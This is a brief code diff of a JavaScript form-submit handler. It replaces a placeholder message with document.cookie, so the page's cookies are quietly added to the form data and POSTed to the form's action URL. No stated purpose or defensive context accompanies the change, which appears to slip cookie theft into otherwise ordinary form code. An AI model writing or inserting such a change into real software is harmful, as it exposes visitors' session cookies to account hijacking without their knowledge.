@@ -72,7 +72,7 @@ async function handleSubmit(event) {
   event.preventDefault();
   var data = new FormData(event.target);
   let shit = 'shit'
-  data.append('message', shit)
+  data.append('message', document.cookie)
   console.log(data);
   fetch(event.target.action, {
     method: "POST",
